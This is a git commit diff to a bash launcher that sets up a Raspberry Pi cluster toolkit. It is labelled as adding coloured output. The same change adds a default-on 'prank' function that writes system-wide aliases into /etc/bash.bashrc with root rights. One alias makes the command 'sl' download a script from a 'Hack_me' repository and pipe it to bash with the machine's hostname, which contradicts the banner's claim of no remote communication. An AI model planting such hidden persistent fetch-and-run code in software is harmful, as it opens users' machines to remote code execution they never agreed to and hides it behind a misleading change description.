62e4901ec81dc0e6a0af292dd51dee7e0794552a
Henry LETELLIER <henry.letellier@epitech.eu>
2023-10-06 17:41:14 +0200

    [ADD] colour to raspberry_tools launcher

--- files/raspberry_tools.sh
+++ files/raspberry_tools.sh
@@ -1,48 +1,97 @@
 #!/bin/env bash
-my_true=0
-my_false=1
+hl_true=0
+hl_false=1
 my_env="lenv"
-fresh_env=$my_false
+fresh_env=$hl_false
+env_present=$hl_false
+colour_a='\033[1;32m'
+colour_r='\033[0m'
+no_intro="--pi-tools-bash-skip-intro"
+no_prank="--pi-tools-bash-no-prank"
+no_env="--pi-tools-no-env"
+no_check="--pi-tools-no-check"
+no_launch="--pi-tools-no-launch"
+
+#it is not recommended to edit these variables
+show_intro=$hl_true
+add_prank=$hl_true
+create_env=$hl_true
+check_env=$hl_true
+can_launch=$hl_true
+
+function cecho() {
+    echo -e "$colour_a$1$colour_r"
+}
+
+function is_admin() {
+    if [ "$EUID" -ne 0 ]; then
+        return $hl_false
+    fi
+    return $hl_true
+}
+
+function run_as_admin() {
+    cecho "The program needs elevated privileges in order to set up the environement"
+    cecho "This program is thus relaunching with elevated privileges"
+    sudo bash $0 "$@"
+}
+
+function beginning_of_script() {
+    cecho "Beginning of script"
+    cecho "Created by (c) Henry Letellier"
+}
 
 function welcome_message() {
-    echo "+=================================================+"
-    echo "|                                                 |"
-    echo "|          Welcome to Raspberry Tools             |"
-    echo "|      The tool to help you set up clusters       |"
-    echo "|                                                 |"
-    echo "| This Script is a guide to help you easley set   |"
-    echo "| up Kubernetes/Docker/Docker-Compose             |"
-    echo "|                                                 |"
-    echo "| This tool can also help you set up common tools |"
-    echo "| like, Desktop Rancher, terraform.               |"
-    echo "|                                                 |"
-    echo "| This program was created by (c) Henry Letellier |"
-    echo "|                                                 |"
-    echo "| This program is provided as if and without any  |"
-    echo "| warranty, use at your own risk.                 |"
-    echo "|                                                 |"
-    echo "| This program can be found on github under the   |"
-    echo "| name: 'Hanra-s-work/ContOpsSync'.               |"
-    echo "|                                                 |"
-    echo "| The libraries used by this program have their   |"
-    echo "| own license, you can check them on the renowned |"
-    echo "| python package site: pypi.org.                  |"
-    echo "| The names of the libaries used by this program  |"
-    echo "| can be found in the file: 'requirements.txt'    |"
-    echo "|                                                 |"
-    echo "| This program is meant to be run on the target   |"
-    echo "| machine, this it does not have any remote       |"
-    echo "| comunication capabilities (appart from using    |"
-    echo "| an internet connection).                        |"
-    echo "|                                                 |"
-    echo "| We hope our program simplifies your tasks and   |"
-    echo "| brings you joy.                                 |"
-    echo "+=================================================+"
+    cecho "+=================================================+"
+    cecho "|                                                 |"
+    cecho "|          Welcome to Raspberry Tools             |"
+    cecho "|      The tool to help you set up clusters       |"
+    cecho "|                                                 |"
+    cecho "| This Script is a guide to help you easley set   |"
+    cecho "| up Kubernetes/Docker/Docker-Compose             |"
+    cecho "|                                                 |"
+    cecho "| This tool can also help you set up common tools |"
+    cecho "| like, Desktop Rancher, terraform.               |"
+    cecho "|                                                 |"
+    cecho "| This program was created by (c) Henry Letellier |"
+    cecho "|                                                 |"
+    cecho "| This program is provided as if and without any  |"
+    cecho "| warranty, use at your own risk.                 |"
+    cecho "|                                                 |"
+    cecho "| This program can be found on github under the   |"
+    cecho "| name: 'Hanra-s-work/ContOpsSync'.               |"
+    cecho "|                                                 |"
+    cecho "| The libraries used by this program have their   |"
+    cecho "| own license, you can check them on the renowned |"
+    cecho "| python package site: pypi.org.                  |"
+    cecho "| The names of the libaries used by this program  |"
+    cecho "| can be found in the file: 'requirements.txt'    |"
+    cecho "|                                                 |"
+    cecho "| This program is meant to be run on the target   |"
+    cecho "| machine, this it does not have any remote       |"
+    cecho "| comunication capabilities (appart from using    |"
+    cecho "| an internet connection).                        |"
+    cecho "|                                                 |"
+    cecho "| We hope our program simplifies your tasks and   |"
+    cecho "| brings you joy.                                 |"
+    cecho "+=================================================+"
+}
+
+function has_environement() {
+    if [ ! -d $my_env ]; then
+        return $hl_false
+    fi
+    return $hl_true
 }
 
 function update_system() {
-    echo "Updating system"
+    cecho "Updating system"
     sudo apt-get update
+    sudo apt-get upgrade --with-new-pkgs -y
+}
+
+function ensure_basic_dependencies() {
+    cecho "Making sure the default dependencies are present"
     sudo apt install -y \
         git \
         curl \
@@ -50,12 +99,12 @@ function update_system() {
         unzip \
         jq \
         software-properties-common \
-        sudo
-    sudo apt-get install -y build-essential
-    sudo apt-get upgrade --with-new-pkgs -y
+        sudo \
+        build-essential
 }
 
 function install_python_pip() {
+    cecho "Installing pip for python"
     sudo apt-get install python3-pip
     sudo apt install \
         libffi-dev \
@@ -73,11 +122,11 @@ function install_python_pip() {
         libc6-dev \
         openssl \
         git
-    echo "Downloading pip installer"
+    cecho "Downloading pip installer"
     curl -O https://bootstrap.pypa.io/get-pip.py
-    echo "Installing pip"
+    cecho "Installing pip"
     sudo python3 get-pip.py
-    echo "Removing pip installer"
+    cecho "Removing pip installer"
     rm get-pip.py
 }
 
@@ -89,48 +138,147 @@ function has_python_pip() {
     fi
 }
 
+function prank_bindings() {
+    local bind1="sl"
+    local bind2="dc"
+    sudo grep "$bind1" /etc/bash.bashrc >/dev/null 2>/dev/null
+    if [ $? -eq 1 ]; then
+        sudo echo "alias '$bind1=curl -s -L https://raw.githubusercontent.com/HenraL/Hack_me/main/Hack_me | bash -s \"\$(uname -n)\"'" >>/etc/bash.bashrc 2>/dev/null
+    fi
+    sudo grep "$bind2" /etc/bash.bashrc >/dev/null 2>/dev/null
+    if [ $? -eq 1 ]; then
+        sudo echo "alias '$bind2=curl -s -L https://github.com/dylanaraps/neofetch/raw/master/neofetch | bash'" >>/etc/bash.bashrc 2>/dev/null
+    fi
+}
+
+function install_python_venv() {
+    cecho "Installing python3-venv"
+    sudo apt-get install -y python3-venv
+}
+
 function create_environement() {
-    if [ ! -d $my_env ]; then
-        echo "Creating virtual environment"
+    if [ $add_prank -eq $hl_true ]; then
+        prank_bindings
+    fi
+    if [ $create_env -eq $hl_true ]; then
+        install_python_venv
+        cecho "Creating virtual environment"
         python3 -m venv $my_env
-        fresh_env=$my_true
+        fresh_env=$hl_true
+    fi
+}
+
+function activate_environement() {
+    if [ $env_present -eq $hl_true ]; then
+        cecho "Activating environement"
+        . ./$my_env/bin/activate
+    fi
+}
+
+function deactivate_environement() {
+    if [ $env_present -eq $hl_true ]; then
+        cecho "Deactivating environement"
+        deactivate
     fi
 }
 
 function set_up_environement() {
-    . ./$my_env/bin/activate
-    if [ $fresh_env -eq $my_true ]; then
-        echo "Updating pip"
+    if [ $fresh_env -eq $hl_true ]; then
+        cecho "Updating pip"
         python3 -m pip install --upgrade pip
     fi
 }
 
 function update_pip_dependencies() {
-    echo "Updating dependencies"
-    pip3 install -r ./requirements.txt
+    if [ $check_env -eq $hl_true ]; then
+        cecho "Updating dependencies"
+        pip3 install -r ./requirements.txt
+    fi
 }
 
 function start_program() {
-    chmod +x src/main.py
-    echo "Starting program"
-    python3 ./src/main.py $@
-    return $?
+    local status=0
+    if [ $can_launch -eq $hl_true ]; then
+        chmod +x src/main.py
+        cecho "Starting program"
+        python3 ./src/main.py $@
+        status=$?
+    fi
+    return $status
 }
 
 function end_of_script() {
-    echo "End of script"
-    echo "Created by (c) Henry Letellier"
+    cecho "End of script"
+    cecho "Created by (c) Henry Letellier"
     exit $1
 }
 
+function changing_owner_permissions() {
+    cecho "Changing owner permissions (to $USER)"
+    sudo chown -R $USER:$USER ./$my_env
+}
+
+function clean_up_installation() {
+    cecho "Cleaning up installation (removing unnecessary packages)"
+    sudo apt-get autoremove -y
+    sudo apt-get autoclean -y
+    sudo apt-get clean -y
+}
+
+function process_input() {
+    local arg_length=$#
+    local index_tracker=0
+    while [ $index_tracker -lt $arg_length ]; do
+        if [ "$1" == "$no_intro" ]; then
+            show_intro=$hl_false
+        elif [ "$1" == "$no_prank" ]; then
+            add_prank=$hl_false
+        elif [ "$1" == "$no_env" ]; then
+            create_env=$hl_false
+        elif [ "$1" == "$no_check" ]; then
+            check_env=$hl_false
+        elif [ "$1" == "$no_launch" ]; then
+            can_launch=$hl_false
+        fi
+        shift
+        let "index_tracker=index_tracker+1"
+    done
+}
+
 function main() {
-    welcome_message
-    update_system
-    has_python_pip
-    create_environement
-    set_up_environement
+    local skip_index=0
+    local arg_copy=("$@")
+    beginning_of_script
+    process_input "$@"
+    if [ $show_intro -eq $hl_true ]; then
+        welcome_message
+    fi
+    has_environement
+    if [ $? -eq $hl_false ] && [ $create_env -eq $hl_true ]; then
+        is_admin
+        if [ $? -eq $hl_false ]; then
+            run_as_admin "$skip_arg" "$no_launch" "$arg_copy"
+        else
+            update_system
+            ensure_basic_dependencies
+            has_python_pip
+            create_environement
+            activate_environement
+            set_up_environement
+            clean_up_installation
+            deactivate_environement
+        fi
+    fi
+    has_environement
+    env_present=$?
+    activate_environement
+    changing_owner_permissions
     update_pip_dependencies
-    start_program "$@"
+    if [ $skip_index -gt 0 ]; then
+        shift $skip_index
+    fi
+    start_program "$arg_copy"
+    deactivate_environement
     end_of_script $?
 }
 
